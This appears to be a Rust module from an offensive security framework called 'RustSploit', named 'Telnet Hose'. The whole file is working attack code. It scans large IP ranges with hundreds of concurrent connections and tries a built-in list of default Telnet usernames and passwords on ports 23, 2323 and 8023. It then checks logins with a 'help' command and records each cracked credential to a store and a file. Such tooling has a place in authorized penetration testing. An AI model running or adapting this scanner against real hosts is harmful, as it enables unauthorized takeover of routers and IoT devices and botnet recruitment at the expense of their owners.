use anyhow::Result;
use std::net::SocketAddr;
use std::time::{Duration, Instant};
use tokio::io::{AsyncReadExt, AsyncWriteExt, BufReader};
use tokio::net::TcpStream;
use tokio::time::timeout;

use crate::modules::creds::utils::{run_mass_scan, MassScanConfig};
use crate::utils::{cfg_prompt_output_file, cfg_prompt_yes_no};

use colored::*;

pub fn info() -> crate::module_info::ModuleInfo {
    crate::module_info::ModuleInfo {
        name: "Telnet Hose (Mass Default Credential Check)".to_string(),
        description: "Rapidly tests default credentials against Telnet services across large IP ranges. Supports mass scanning with concurrent connections and multiple default port checks.".to_string(),
        authors: vec!["RustSploit Contributors".to_string()],
        references: vec![],
        disclosure_date: None,
        rank: crate::module_info::ModuleRank::Normal,
    }
}

// Top 3 Telnet Ports
const TELNET_PORTS: &[u16] = &[23, 2323, 8023];

// Default Credentials (user, pass) tuples
const TOP_CREDENTIALS: &[(&str, &str)] = &[
    ("root", "root"),
    ("root", "admin"),
    ("root", "user"),
    ("root", "1234"),
    ("root", "123456"),
    ("root", "password"),
    ("root", "password123"),
    ("root", "default"),
    ("root", "support"),
    ("root", "guest"),
    ("root", ""),
    ("admin", "root"),
    ("admin", "admin"),
    ("admin", "user"),
    ("admin", "1234"),
    ("admin", "123456"),
    ("admin", "password"),
    ("admin", "password123"),
    ("admin", "default"),
    ("admin", "support"),
    ("admin", "guest"),
    ("admin", ""),
    ("user", "root"),
    ("user", "admin"),
    ("user", "user"),
    ("user", "1234"),
    ("user", "123456"),
    ("user", "password"),
    ("user", "password123"),
    ("user", "default"),
    ("user", "support"),
    ("user", "guest"),
    ("user", ""),
    ("support", "root"),
    ("support", "admin"),
    ("support", "user"),
    ("support", "1234"),
    ("support", "123456"),
    ("support", "password"),
    ("support", "password123"),
    ("support", "default"),
    ("support", "support"),
    ("support", "guest"),
    ("support", ""),
    ("guest", "root"),
    ("guest", "admin"),
    ("guest", "user"),
    ("guest", "1234"),
    ("guest", "123456"),
    ("guest", "password"),
    ("guest", "password123"),
    ("guest", "default"),
    ("guest", "support"),
    ("guest", "guest"),
    ("guest", ""),
    ("1234", "1234"),
];

// Keywords to match in help output (must match at least 2)
const HELP_KEYWORDS: &[&str] = &[
    "show", "user", "system", "help", "exit", "quit", "logout", "enable", "config", "command",
    "menu", "admin",
];

// Internal Logic Constants
const CONNECT_TIMEOUT_MS: u64 = 2000;
const LOGIN_TIMEOUT_MS: u64 = 6000; // Total time for a login attempt

#[derive(Debug, PartialEq, Clone, Copy)]
enum TelnetState {
    WaitingForBanner,
    SendingUsername,
    WaitingForPasswordPrompt,
    SendingPassword,
    WaitingForResult,
    SendingHelp,
    WaitingForHelpResponse,
}

pub async fn run(target: &str) -> Result<()> {
    let verbose = cfg_prompt_yes_no("verbose", "Verbose output?", false).await?;
    let save_results = cfg_prompt_yes_no("save_results", "Save results?", false).await?;
    let results_file = if save_results {
        Some(
            cfg_prompt_output_file(
                "results_file",
                "Results output file",
                "telnet_hose_creds.txt",
            )
            .await?,
        )
    } else {
        None
    };

    let results_file_clone = results_file.clone();
    let verbose_flag = verbose;

    // Use the shared mass scan engine with telnet probe
    run_mass_scan(
        target,
        MassScanConfig {
            protocol_name: "Telnet-Hose",
            default_port: 23,
            state_file: "telnet_hose_state.log",
            default_output: "telnet_hose_results.txt",
            default_concurrency: 500,
        },
        move |ip, port| {
            let rf = results_file_clone.clone();
            async move {
                // Also try alternate telnet ports beyond the configured one
                let ports_to_try: Vec<u16> = if TELNET_PORTS.contains(&port) {
                    TELNET_PORTS.to_vec()
                } else {
                    let mut v = vec![port];
                    v.extend_from_slice(TELNET_PORTS);
                    v.sort_unstable();
                    v.dedup();
                    v
                };

                for &p in &ports_to_try {
                    let socket = SocketAddr::new(ip, p);
                    // Quick connect check
                    if verbose_flag {
                        crate::mprintln!(
                            "{}",
                            format!("[VERBOSE] Checking {}:{} connectivity...", ip, p).dimmed()
                        );
                    }
                    if !crate::utils::tcp_port_open(ip, p, std::time::Duration::from_secs(2)).await
                    {
                        if verbose_flag {
                            crate::mprintln!(
                                "{}",
                                format!("[VERBOSE] {}:{} - port closed/filtered", ip, p).dimmed()
                            );
                        }
                        continue;
                    }
                    if verbose_flag {
                        crate::mprintln!(
                            "{}",
                            format!("[VERBOSE] {}:{} - port open, trying credentials...", ip, p)
                                .dimmed()
                        );
                    }

                    // Try each credential pair
                    for (user, pass) in TOP_CREDENTIALS.iter() {
                        if verbose_flag {
                            crate::mprintln!(
                                "{}",
                                format!("[VERBOSE] {}:{} trying {}:{}", ip, p, user, pass).dimmed()
                            );
                        }
                        if let Ok(true) = try_telnet_login_hose(&socket, user, pass).await {
                            let ts = chrono::Local::now().format("%Y-%m-%d %H:%M:%S");
                            let line = format!("[{}] {}:{}:{}:{}\n", ts, ip, p, user, pass);

                            // Store credential in framework credential store
                            let _ = crate::cred_store::store_credential(
                                &ip.to_string(),
                                p,
                                "telnet",
                                user,
                                pass,
                                crate::cred_store::CredType::Password,
                                "creds/generic/telnet_hose",
                            )
                            .await;

                            // Save to dedicated results file if requested
                            if let Some(ref path) = rf {
                                use std::os::unix::fs::OpenOptionsExt;
                                let mut opts = std::fs::OpenOptions::new();
                                opts.create(true).append(true);
                                opts.mode(0o600);
                                if let Ok(mut f) = opts.open(path) {
                                    let _ = std::io::Write::write_all(&mut f, line.as_bytes());
                                }
                            }

                            return Some(line);
                        }
                    }
                }
                None
            }
        },
    )
    .await
}

// Simplified & Optimized Telnet Login for Hose
// Wrapper for retry logic
async fn try_telnet_login_hose(
    socket: &SocketAddr,
    username: &str,
    password: &str,
) -> Result<bool> {
    // Attempt 1: Standard (try to detect, fallback to User+Pass)
    let (success, banner_seen) = do_telnet_session(socket, username, password, false).await?;
    if success {
        return Ok(true);
    }

    // If we failed AND never saw a proper banner (blind/silence), retry with Password Only
    if !banner_seen {
        // Attempt 2: Blind Password Only
        let (success_retry, _) = do_telnet_session(socket, username, password, true).await?;
        if success_retry {
            return Ok(true);
        }
    }

    Ok(false)
}

// Inner session logic
async fn do_telnet_session(
    socket: &SocketAddr,
    username: &str,
    password: &str,
    force_password_only: bool,
) -> Result<(bool, bool)> {
    // returns (success, banner_detected)

    let stream_res = timeout(
        Duration::from_millis(CONNECT_TIMEOUT_MS),
        TcpStream::connect(socket),
    )
    .await;

    let stream = match stream_res {
        Ok(Ok(s)) => s,
        _ => return Ok((false, false)), // Connect fail
    };

    let (reader, mut writer) = tokio::io::split(stream);
    let mut reader = BufReader::new(reader);
    let mut buf = [0u8; 1024];

    // State Machine
    let mut state = TelnetState::WaitingForBanner;
    let start = Instant::now();
    let max_duration = Duration::from_millis(LOGIN_TIMEOUT_MS);
    let mut banner_detected = false;

    while start.elapsed() < max_duration {
        // Simple Read with Timeout
        let read_future = reader.read(&mut buf);
        let n = match timeout(Duration::from_millis(1500), read_future).await {
            Ok(Ok(0)) => return Ok((false, banner_detected)), // EOF
            Ok(Ok(n)) => n,
            Ok(Err(_)) => return Ok((false, banner_detected)), // Error
            Err(_) => {
                // Read Timeout logic

                // If waiting for banner and timed out -> No Banner Detected
                if state == TelnetState::WaitingForBanner {
                    // Decide action based on mode
                    if force_password_only {
                        state = TelnetState::SendingPassword;
                    } else {
                        state = TelnetState::SendingUsername;
                    }
                    continue;
                }

                if state == TelnetState::WaitingForResult
                    || state == TelnetState::WaitingForHelpResponse
                {
                    // Timeout waiting for result/help usually means fail or stuck
                    return Ok((false, banner_detected));
                }

                continue;
            }
        };

        // IAC Stripping (Minimal)
        let s = String::from_utf8_lossy(&buf[..n]);
        let lower = s.to_lowercase();

        // Handle current state
        match state {
            TelnetState::WaitingForBanner => {
                if lower.contains("pass") || lower.contains("word") {
                    banner_detected = true;
                    state = TelnetState::SendingPassword;
                } else if lower.contains("login")
                    || lower.contains("user")
                    || lower.contains("name")
                {
                    banner_detected = true;
                    state = TelnetState::SendingUsername;
                }
            }
            TelnetState::SendingUsername => {
                // Should not happen here if we just transitioned,
                // but if we are reading response after sending user:
                if lower.contains("pass") || lower.contains("word") {
                    state = TelnetState::SendingPassword;
                }
            }
            TelnetState::WaitingForPasswordPrompt => {
                if lower.contains("pass") || lower.contains("word") {
                    state = TelnetState::SendingPassword;
                }
            }
            TelnetState::WaitingForResult => {
                if lower.contains("incorrect")
                    || lower.contains("fail")
                    || lower.contains("denied")
                    || lower.contains("error")
                {
                    return Ok((false, banner_detected));
                }

                if lower.contains("#")
                    || lower.contains("$")
                    || (lower.contains(">") && !lower.contains(">>"))
                    || lower.contains("welcome")
                {
                    state = TelnetState::SendingHelp;
                }
            }
            TelnetState::WaitingForHelpResponse => {
                let mut match_count = 0;
                for kw in HELP_KEYWORDS {
                    if lower.contains(kw) {
                        match_count += 1;
                    }
                }
                if match_count >= 2 {
                    return Ok((true, banner_detected));
                }
            }
            _ => {}
        }

        // Perform Writes if needed
        match state {
            TelnetState::SendingUsername => {
                let _ = writer
                    .write_all(format!("{}\r\n", username).as_bytes())
                    .await;
                // Add requested 2s delay
                tokio::time::sleep(Duration::from_secs(2)).await;
                state = TelnetState::WaitingForPasswordPrompt;
            }
            TelnetState::SendingPassword => {
                let _ = writer
                    .write_all(format!("{}\r\n", password).as_bytes())
                    .await;
                state = TelnetState::WaitingForResult;
            }
            TelnetState::SendingHelp => {
                let _ = writer.write_all(b"help\r\n").await;
                state = TelnetState::WaitingForHelpResponse;
            }
            _ => {}
        }
    }

    Ok((false, banner_detected))
}
